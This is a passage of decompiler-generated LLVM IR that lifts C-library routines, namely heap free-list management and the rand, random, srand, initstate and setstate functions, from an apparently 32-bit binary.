dec_label_pc_10010968:                            ; preds = %dec_label_pc_10010960.dec_label_pc_10010968_crit_edge, %dec_label_pc_10010960.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1001091c, { 1, 0 }
  uselistorder i32 %v2_100108f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1001095c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_10010944, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001094c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001091c, { 1, 0 }
  uselistorder label %dec_label_pc_100108f0, { 1, 0 }
  uselistorder label %dec_label_pc_10010960.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10010970 = icmp eq i32 %arg3, 0
  %v2_10010974 = add i32 %arg2, 4
  %v3_10010974 = inttoptr i32 %v2_10010974 to i32*
  store i32 %arg4, i32* %v3_10010974, align 4
  %v2_10010978 = add i32 %arg2, 8
  %v3_10010978 = inttoptr i32 %v2_10010978 to i32*
  store i32 %arg3, i32* %v3_10010978, align 4
  br i1 %v3_10010970, label %dec_label_pc_10010988, label %dec_label_pc_10010980

dec_label_pc_10010980:                            ; preds = %entry
  %v2_10010980 = add i32 %arg3, 4
  %v3_10010980 = inttoptr i32 %v2_10010980 to i32*
  store i32 %arg2, i32* %v3_10010980, align 4
  br label %dec_label_pc_1001098c

dec_label_pc_10010988:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1001098c

dec_label_pc_1001098c:                            ; preds = %dec_label_pc_10010980, %dec_label_pc_10010988
  %v3_1001098c = icmp eq i32 %arg4, 0
  %v0_10010990 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001098c, i32 %v0_10010990)
  %v2_10010994 = add i32 %arg4, 8
  %v3_10010994 = inttoptr i32 %v2_10010994 to i32*
  store i32 %arg2, i32* %v3_10010994, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 3, 0, 1, 4, 2 }
  uselistorder label %dec_label_pc_1001098c, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1001099c = icmp eq i32 %arg3, 0
  br i1 %v3_1001099c, label %dec_label_pc_100109ac, label %dec_label_pc_100109a4

dec_label_pc_100109a4:                            ; preds = %entry
  %v2_100109a4 = add i32 %arg3, 4
  %v3_100109a4 = inttoptr i32 %v2_100109a4 to i32*
  store i32 %arg2, i32* %v3_100109a4, align 4
  br label %dec_label_pc_100109b0

dec_label_pc_100109ac:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100109b0

dec_label_pc_100109b0:                            ; preds = %dec_label_pc_100109a4, %dec_label_pc_100109ac
  %v2_100109b0 = add i32 %arg2, 8
  %v3_100109b0 = inttoptr i32 %v2_100109b0 to i32*
  store i32 %arg3, i32* %v3_100109b0, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100109b0, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_100109d0 = load i32, i32* %arg1, align 4
  store i32 %v2_100109d0, i32* @r31, align 4
  %v2_100109d4 = add i32 %arg3, %arg2
  store i32 %v2_100109d4, i32* %r3.global-to-local, align 4
  %v3_100109e87 = icmp eq i32 %v2_100109d0, 0
  %v1_100109ec8 = add i32 %v2_100109d0, 12
  %tmp69 = icmp uge i32 %v1_100109ec8, %arg2
  %or.cond10 = or i1 %v3_100109e87, %tmp69
  br i1 %or.cond10, label %dec_label_pc_100109f8, label %dec_label_pc_100109e0

dec_label_pc_100109e0:                            ; preds = %entry, %dec_label_pc_100109e0
  %v0_10010a4011 = phi i32 [ %v3_100109e4, %dec_label_pc_100109e0 ], [ %v2_100109d0, %entry ]
  store i32 %v0_10010a4011, i32* %r11.global-to-local, align 4
  %v1_100109e4 = add i32 %v0_10010a4011, 4
  %v2_100109e4 = inttoptr i32 %v1_100109e4 to i32*
  %v3_100109e4 = load i32, i32* %v2_100109e4, align 4
  store i32 %v3_100109e4, i32* @r31, align 4
  %v3_100109e8 = icmp eq i32 %v3_100109e4, 0
  %v1_100109ec = add i32 %v3_100109e4, 12
  %tmp6 = icmp uge i32 %v1_100109ec, %arg2
  %or.cond = or i1 %v3_100109e8, %tmp6
  br i1 %or.cond, label %dec_label_pc_100109f8, label %dec_label_pc_100109e0

dec_label_pc_100109f8:                            ; preds = %dec_label_pc_100109e0, %entry
  %v0_10010a34.lcssa = phi i32 [ 0, %entry ], [ %v0_10010a4011, %dec_label_pc_100109e0 ]
  %v0_10010a40.lcssa = phi i32 [ %v2_100109d0, %entry ], [ %v3_100109e4, %dec_label_pc_100109e0 ]
  %v3_100109e8.lcssa = phi i1 [ %v3_100109e87, %entry ], [ %v3_100109e8, %dec_label_pc_100109e0 ]
  br i1 %v3_100109e8.lcssa, label %dec_label_pc_10010ab0, label %dec_label_pc_10010a00

dec_label_pc_10010a00:                            ; preds = %dec_label_pc_100109f8
  %v1_10010a00 = inttoptr i32 %v0_10010a40.lcssa to i32*
  %v2_10010a00 = load i32, i32* %v1_10010a00, align 4
  %v2_10010a04 = sub i32 %v0_10010a40.lcssa, %v2_10010a00
  %v1_10010a08 = add i32 %v2_10010a04, 12
  %v3_10010a0c = icmp ugt i32 %v1_10010a08, %v2_100109d4
  br i1 %v3_10010a0c, label %dec_label_pc_10010ab0, label %dec_label_pc_10010a14

dec_label_pc_10010a14:                            ; preds = %dec_label_pc_10010a00
  %v4_10010a0c = icmp eq i32 %v1_10010a08, %v2_100109d4
  %v2_10010a18 = add i32 %v2_10010a00, %arg3
  store i32 %v2_10010a18, i32* @r29, align 4
  br i1 %v4_10010a0c, label %dec_label_pc_10010a20, label %dec_label_pc_10010a50

dec_label_pc_10010a20:                            ; preds = %dec_label_pc_10010a14
  %v3_10010a20 = icmp eq i32 %v0_10010a34.lcssa, 0
  br i1 %v3_10010a20, label %dec_label_pc_10010aa4, label %dec_label_pc_10010a28

dec_label_pc_10010a28:                            ; preds = %dec_label_pc_10010a20
  %v1_10010a28 = add i32 %v0_10010a34.lcssa, 12
  %v4_10010a2c = icmp eq i32 %v1_10010a28, %arg2
  br i1 %v4_10010a2c, label %dec_label_pc_10010a34, label %dec_label_pc_10010aa4

dec_label_pc_10010a34:                            ; preds = %dec_label_pc_10010a28
  %v1_10010a34 = inttoptr i32 %v0_10010a34.lcssa to i32*
  %v2_10010a34 = load i32, i32* %v1_10010a34, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_10010a3c = add i32 %v0_10010a34.lcssa, 8
  %v2_10010a3c = inttoptr i32 %v1_10010a3c to i32*
  %v3_10010a3c = load i32, i32* %v2_10010a3c, align 4
  %v2_10010a44 = add i32 %v2_10010a34, %v2_10010a18
  store i32 %v2_10010a44, i32* @r29, align 4
  %v5_10010a48 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_10010a40.lcssa, i32 %v3_10010a3c, i32 %v2_100109d4)
  store i32 %v5_10010a48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010aa4

dec_label_pc_10010a50:                            ; preds = %dec_label_pc_10010a14
  %v1_10010a50 = add i32 %v0_10010a40.lcssa, 4
  %v2_10010a50 = inttoptr i32 %v1_10010a50 to i32*
  %v3_10010a50 = load i32, i32* %v2_10010a50, align 4
  %v3_10010a54 = icmp eq i32 %v3_10010a50, 0
  br i1 %v3_10010a54, label %dec_label_pc_10010a8c, label %dec_label_pc_10010a5c

dec_label_pc_10010a5c:                            ; preds = %dec_label_pc_10010a50
  %v1_10010a5c = inttoptr i32 %v3_10010a50 to i32*
  %v2_10010a5c = load i32, i32* %v1_10010a5c, align 4
  %v2_10010a60 = sub i32 %v3_10010a50, %v2_10010a5c
  %v1_10010a64 = add i32 %v2_10010a60, 12
  %v4_10010a68 = icmp eq i32 %v2_100109d4, %v1_10010a64
  br i1 %v4_10010a68, label %dec_label_pc_10010a70, label %dec_label_pc_10010a8c

dec_label_pc_10010a70:                            ; preds = %dec_label_pc_10010a5c
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10010a7c = add i32 %v2_10010a5c, %v2_10010a18
  store i32 %v2_10010a7c, i32* @r29, align 4
  store i32 %v3_10010a50, i32* @r31, align 4
  %v5_10010a84 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_10010a50, i32 %v0_10010a34.lcssa, i32 %v2_100109d4)
  store i32 %v5_10010a84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010aa4

dec_label_pc_10010a8c:                            ; preds = %dec_label_pc_10010a5c, %dec_label_pc_10010a50
  %v2_10010a8c = add i32 %v0_10010a40.lcssa, %arg3
  store i32 %v2_10010a8c, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268503716, i32* @lr, align 4
  %v5_10010aa0 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_10010a8c, i32 %v0_10010a34.lcssa, i32 %v3_10010a50)
  store i32 %v5_10010aa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010aa4

dec_label_pc_10010aa4:                            ; preds = %dec_label_pc_10010a28, %dec_label_pc_10010a20, %dec_label_pc_10010a70, %dec_label_pc_10010a34, %dec_label_pc_10010a8c
  %v0_10010aa4 = load i32, i32* @r31, align 4
  store i32 %v0_10010aa4, i32* @r30, align 4
  %v0_10010aa8 = load i32, i32* @r29, align 4
  %v2_10010aa8 = inttoptr i32 %v0_10010aa4 to i32*
  store i32 %v0_10010aa8, i32* %v2_10010aa8, align 4
  br label %dec_label_pc_10010acc

dec_label_pc_10010ab0:                            ; preds = %dec_label_pc_10010a00, %dec_label_pc_100109f8
  %v2_10010ab0 = add i32 %v2_100109d4, -12
  %v3_10010ab0 = inttoptr i32 %v2_10010ab0 to i32*
  store i32 %arg3, i32* %v3_10010ab0, align 4
  %v0_10010ab4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010ab4 = add i32 %v0_10010ab4, -12
  store i32 %v1_10010ab4, i32* @r30, align 4
  %v0_10010ab8 = load i32, i32* %r11.global-to-local, align 4
  %v0_10010abc = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10010abc, i32* %r3.global-to-local, align 4
  %v0_10010ac0 = load i32, i32* @r31, align 4
  store i32 268503756, i32* @lr, align 4
  %v4_10010ac8 = inttoptr i32 %v0_10010abc to i32*
  %v5_10010ac8 = call i32 @__heap_link_free_area(i32* %v4_10010ac8, i32 %v1_10010ab4, i32 %v0_10010ab8, i32 %v0_10010ac0)
  store i32 %v5_10010ac8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010acc

dec_label_pc_10010acc:                            ; preds = %dec_label_pc_10010aa4, %dec_label_pc_10010ab0
  %v0_10010ad0 = load i32, i32* @r30, align 4
  store i32 %v0_10010ad0, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010ad0

; uselistorder directives
  uselistorder i32 %v3_10010a50, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_10010a08, { 1, 0 }
  uselistorder i32 %v0_10010a40.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_10010a34.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_100109e4, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_100109d4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10010acc, { 1, 0 }
  uselistorder label %dec_label_pc_10010aa4, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_100109e0, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_10010ae4 = call i32 @random()
  ret i32 %v0_10010ae4

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_10010afc = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1002c790.1097 to i32), i32* @r29, align 4
  store i32 %v2_10010afc, i32* @r3, align 4
  %v0_10010b14 = call i32 @__pthread_return_void()
  %v0_10010b1c = call i32 @__pthread_return_0()
  %v2_10010b24 = ptrtoint i32* %stack_var_-56 to i32
  %v3_10010b2c = call i32 @__GI_random_r(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -14424) to i32*), i32 %v2_10010b24)
  store i32 %v2_10010afc, i32* @r3, align 4
  %v0_10010b38 = call i32 @__pthread_return_void()
  %v3_10010b40 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_10010b40
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002c790.1097 to i32), i32* %r29.global-to-local, align 4
  %v2_10010b78 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010b78, i32* @r3, align 4
  %v0_10010b80 = call i32 @__pthread_return_void()
  %v0_10010b88 = call i32 @__pthread_return_0()
  store i32 268503972, i32* @lr, align 4
  %v3_10010ba0 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1002c7a8)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10010ba8 = icmp slt i32 %v3_10010ba0, 0
  store i32 %v2_10010b78, i32* @r3, align 4
  br i1 %v1_10010ba8, label %dec_label_pc_10010bbc, label %dec_label_pc_10010bb8

dec_label_pc_10010bb8:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1002c7ac.1101 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10010bbc

dec_label_pc_10010bbc:                            ; preds = %entry, %dec_label_pc_10010bb8
  %v0_10010bbc = call i32 @__pthread_return_void()
  %v0_10010bc4 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_10010bc4

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10010bbc, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_10010be8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10010be8, i32* @r3, align 4
  %v0_10010c10 = call i32 @__pthread_return_void()
  %v0_10010c18 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268504120, i32* @lr, align 4
  %v4_10010c34 = inttoptr i32 %arg1 to i32*
  %v5_10010c34 = call i32 @__GI_initstate_r(i32* %v4_10010c34, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1002c7a8 to i32))
  store i32 %v2_10010be8, i32* @r3, align 4
  %v0_10010c40 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1002c7ac.1101 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10010c74 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010c74, i32* @r3, align 4
  %v0_10010c90 = call i32 @__pthread_return_void()
  %v0_10010c98 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1002c7a8 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268504236, i32* @lr, align 4
  %v0_10010ca8 = call i32 @srandom_r()
  store i32 %v2_10010c74, i32* @r3, align 4
  %v0_10010cb4 = call i32 @__pthread_return_void()
  ret i32 %v0_10010cb4

; uselistorder directives
  uselistorder i32* @global_var_1002c7a8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c7a8 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10010ccc = add i32 %tmp, 12
  %v2_10010ccc = inttoptr i32 %v1_10010ccc to i32*
  %v3_10010ccc = load i32, i32* %v2_10010ccc, align 4
  store i32 %v3_10010ccc, i32* %r11.global-to-local, align 4
  %v0_10010cd0 = load i32, i32* @lr, align 4
  store i32 %v0_10010cd0, i32* %r0.global-to-local, align 4
  %v1_10010cd8 = add i32 %arg1, 4
  store i32 %v1_10010cd8, i32* %r3.global-to-local, align 4
  %v3_10010cdc = icmp eq i32 %v3_10010ccc, 0
  %v1_10010ce0 = add i32 %tmp, 8
  %v2_10010ce0 = inttoptr i32 %v1_10010ce0 to i32*
  %v3_10010ce0 = load i32, i32* %v2_10010ce0, align 4
  store i32 %v3_10010ce0, i32* %r9.global-to-local, align 4
  br i1 %v3_10010cdc, label %dec_label_pc_10010cec, label %dec_label_pc_10010cf4

dec_label_pc_10010cec:                            ; preds = %entry
  %v2_10010cec = add i32 %v3_10010ce0, -4
  %v3_10010cec = inttoptr i32 %v2_10010cec to i32*
  store i32 0, i32* %v3_10010cec, align 4
  br label %dec_label_pc_10010d0c

dec_label_pc_10010cf4:                            ; preds = %entry
  %v1_10010cf4 = add i32 %tmp, 4
  %v2_10010cf4 = inttoptr i32 %v1_10010cf4 to i32*
  %v3_10010cf4 = load i32, i32* %v2_10010cf4, align 4
  %v2_10010cf8 = sub i32 %v3_10010cf4, %v3_10010ce0
  %v4_10010cfc = sdiv i32 %v2_10010cf8, 4
  %v1_10010d00 = mul i32 %v4_10010cfc, 5
  %v2_10010d04 = add i32 %v1_10010d00, %v3_10010ccc
  store i32 %v2_10010d04, i32* %r0.global-to-local, align 4
  %v2_10010d08 = add i32 %v3_10010ce0, -4
  %v3_10010d08 = inttoptr i32 %v2_10010d08 to i32*
  store i32 %v2_10010d04, i32* %v3_10010d08, align 4
  br label %dec_label_pc_10010d0c

dec_label_pc_10010d0c:                            ; preds = %dec_label_pc_10010cec, %dec_label_pc_10010cf4
  %v0_10010d0c = load i32, i32* %r3.global-to-local, align 4
  %v1_10010d0c = add i32 %v0_10010d0c, -4
  %v2_10010d0c = inttoptr i32 %v1_10010d0c to i32*
  %v3_10010d0c = load i32, i32* %v2_10010d0c, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001bf34.1102 to i32), i32* %r9.global-to-local, align 4
  %v2_10010d1c = srem i32 %v3_10010d0c, 5
  store i32 %v2_10010d1c, i32* %r11.global-to-local, align 4
  %v2_10010d2c = icmp ugt i32 %v2_10010d1c, 4
  %v1_10010d30 = mul nsw i32 %v2_10010d1c, 4
  store i32 %v1_10010d30, i32* %r0.global-to-local, align 4
  %v2_10010d38 = add i32 %v1_10010d30, ptrtoint (i32* @global_var_1001bf34.1102 to i32)
  store i32 %v2_10010d38, i32* %r10.global-to-local, align 4
  br i1 %v2_10010d2c, label %dec_label_pc_10010d9c, label %dec_label_pc_10010d40

dec_label_pc_10010d40:                            ; preds = %dec_label_pc_10010d0c
  %v3_10010d34 = icmp eq i32 %v2_10010d1c, 0
  %v1_10010d40 = add i32 %v1_10010d30, add (i32 ptrtoint (i32* @global_var_1001bf34.1102 to i32), i32 20)
  %v2_10010d40 = inttoptr i32 %v1_10010d40 to i32*
  %v3_10010d40 = load i32, i32* %v2_10010d40, align 4
  store i32 %v3_10010d40, i32* %r10.global-to-local, align 4
  %v3_10010d44 = inttoptr i32 %v2_10010d38 to i32*
  %v4_10010d44 = load i32, i32* %v3_10010d44, align 4
  store i32 %v4_10010d44, i32* %r9.global-to-local, align 4
  %v1_10010d48 = mul i32 %v3_10010d40, 4
  store i32 %v1_10010d48, i32* %r0.global-to-local, align 4
  %v2_10010d4c = add i32 %tmp, 16
  %v3_10010d4c = inttoptr i32 %v2_10010d4c to i32*
  store i32 %v3_10010d40, i32* %v3_10010d4c, align 4
  %v0_10010d50 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010d50 = add i32 %tmp, 20
  %v3_10010d50 = inttoptr i32 %v2_10010d50 to i32*
  store i32 %v0_10010d50, i32* %v3_10010d50, align 4
  %v0_10010d54 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010d54 = load i32, i32* %r0.global-to-local, align 4
  %v2_10010d54 = add i32 %v1_10010d54, %v0_10010d54
  store i32 %v2_10010d54, i32* %r8.global-to-local, align 4
  %v0_10010d58 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10010d58, i32* %v2_10010ccc, align 4
  br i1 %v3_10010d34, label %dec_label_pc_10010d90, label %dec_label_pc_10010d60

dec_label_pc_10010d60:                            ; preds = %dec_label_pc_10010d40
  %v0_10010d60 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010d60 = add i32 %v0_10010d60, -4
  %v2_10010d60 = inttoptr i32 %v1_10010d60 to i32*
  %v3_10010d60 = load i32, i32* %v2_10010d60, align 4
  %v1_10010d64 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010d64 = sdiv i32 %v3_10010d60, %v1_10010d64
  %v1_10010d68 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010d68 = add i32 %v1_10010d68, %v2_10010d64
  store i32 %v2_10010d68, i32* %r9.global-to-local, align 4
  %v1_10010d6c = mul i32 %v2_10010d64, 4
  %v1_10010d70 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010d70 = sdiv i32 %v2_10010d68, %v1_10010d70
  store i32 %v2_10010d70, i32* %r11.global-to-local, align 4
  %v2_10010d74 = add i32 %v1_10010d6c, %v0_10010d60
  store i32 %v2_10010d74, i32* %r0.global-to-local, align 4
  %v2_10010d78 = add i32 %tmp, 4
  %v3_10010d78 = inttoptr i32 %v2_10010d78 to i32*
  store i32 %v2_10010d74, i32* %v3_10010d78, align 4
  %v0_10010d7c = load i32, i32* %r11.global-to-local, align 4
  %v1_10010d7c = load i32, i32* %r10.global-to-local, align 4
  %v2_10010d7c = mul i32 %v1_10010d7c, %v0_10010d7c
  store i32 %v2_10010d7c, i32* %r11.global-to-local, align 4
  %v1_10010d80 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010d80 = sub i32 %v1_10010d80, %v2_10010d7c
  %v1_10010d84 = mul i32 %v2_10010d80, 4
  %v0_10010d88 = load i32, i32* %r3.global-to-local, align 4
  %v2_10010d88 = add i32 %v1_10010d84, %v0_10010d88
  store i32 %v2_10010d88, i32* %r9.global-to-local, align 4
  store i32 %v2_10010d88, i32* %arg2, align 4
  br label %dec_label_pc_10010d90

dec_label_pc_10010d90:                            ; preds = %dec_label_pc_10010d40, %dec_label_pc_10010d60
  %v0_10010d90 = load i32, i32* %r8.global-to-local, align 4
  %v2_10010d90 = add i32 %tmp, 24
  %v3_10010d90 = inttoptr i32 %v2_10010d90 to i32*
  store i32 %v0_10010d90, i32* %v3_10010d90, align 4
  %v0_10010d94 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10010d94, i32* %v2_10010ce0, align 4
  %v0_10010db0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010dac

dec_label_pc_10010d9c:                            ; preds = %dec_label_pc_10010d0c
  %v0_10010d9c = call i32 @__errno_location()
  store i32 %v0_10010d9c, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10010da4 = inttoptr i32 %v0_10010d9c to i32*
  store i32 22, i32* %v2_10010da4, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010dac

dec_label_pc_10010dac:                            ; preds = %dec_label_pc_10010d90, %dec_label_pc_10010d9c
  %v0_10010db0 = phi i32 [ %v0_10010db0.pre, %dec_label_pc_10010d90 ], [ -1, %dec_label_pc_10010d9c ]
  store i32 %v0_10010cd0, i32* %r0.global-to-local, align 4
  store i32 %v0_10010db0, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010db0

; uselistorder directives
  uselistorder i32 %v0_10010db0, { 1, 0 }
  uselistorder i32 %v3_10010d40, { 1, 0, 2 }
  uselistorder i32 %v1_10010d30, { 2, 1, 0 }
  uselistorder i32 %v2_10010d1c, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 4, 0, 3, 6, 5, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_10010dac, { 1, 0 }
  uselistorder label %dec_label_pc_10010d90, { 1, 0 }
  uselistorder label %dec_label_pc_10010d0c, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10010dc0 = add i32 %tmp, 12
  %v2_10010dc0 = inttoptr i32 %v1_10010dc0 to i32*
  %v3_10010dc0 = load i32, i32* %v2_10010dc0, align 4
  %v1_10010dcc = add i32 %tmp, 8
  %v2_10010dcc = inttoptr i32 %v1_10010dcc to i32*
  %v3_10010dcc = load i32, i32* %v2_10010dcc, align 4
  store i32 %v3_10010dcc, i32* %r7.global-to-local, align 4
  %v3_10010dd0 = icmp eq i32 %v3_10010dc0, 0
  br i1 %v3_10010dd0, label %dec_label_pc_10010dd8, label %dec_label_pc_10010df4

dec_label_pc_10010dd8:                            ; preds = %entry
  %v1_10010dd8 = inttoptr i32 %v3_10010dcc to i32*
  %v2_10010dd8 = load i32, i32* %v1_10010dd8, align 4
  %v2_10010ddc = mul i32 %v2_10010dd8, 1103515245
  %v1_10010de0 = add i32 %v2_10010ddc, 12345
  %v1_10010de4 = urem i32 %v1_10010de0, -2147483648
  store i32 %v1_10010de4, i32* %r9.global-to-local, align 4
  store i32 %v1_10010de4, i32* %v1_10010dd8, align 4
  %v0_10010dec = load i32, i32* %r9.global-to-local, align 4
  %v2_10010dec = inttoptr i32 %arg2 to i32*
  store i32 %v0_10010dec, i32* %v2_10010dec, align 4
  br label %dec_label_pc_10010e48

dec_label_pc_10010df4:                            ; preds = %entry
  %v2_10010df4 = load i32, i32* %arg1, align 4
  %v1_10010df8 = add i32 %tmp, 4
  %v2_10010df8 = inttoptr i32 %v1_10010df8 to i32*
  %v3_10010df8 = load i32, i32* %v2_10010df8, align 4
  store i32 %v3_10010df8, i32* %r9.global-to-local, align 4
  %v1_10010dfc = add i32 %tmp, 24
  %v2_10010dfc = inttoptr i32 %v1_10010dfc to i32*
  %v3_10010dfc = load i32, i32* %v2_10010dfc, align 4
  %v1_10010e00 = add i32 %v2_10010df4, 4
  store i32 %v1_10010e00, i32* %r8.global-to-local, align 4
  %v1_10010e04 = add i32 %v3_10010df8, 4
  %v1_10010e08 = inttoptr i32 %v3_10010df8 to i32*
  %v2_10010e08 = load i32, i32* %v1_10010e08, align 4
  store i32 %v2_10010e08, i32* %r9.global-to-local, align 4
  %v2_10010e0c = icmp ult i32 %v1_10010e00, %v3_10010dfc
  %v1_10010e14 = inttoptr i32 %v2_10010df4 to i32*
  %v2_10010e14 = load i32, i32* %v1_10010e14, align 4
  store i32 %v1_10010e04, i32* %r10.global-to-local, align 4
  %v2_10010e1c = add i32 %v2_10010e14, %v2_10010e08
  %v1_10010e20 = udiv i32 %v2_10010e1c, 2
  store i32 %v1_10010e20, i32* %r9.global-to-local, align 4
  store i32 %v2_10010e1c, i32* %v1_10010e14, align 4
  %v0_10010e28 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010e28 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10010e28, i32* %v2_10010e28, align 4
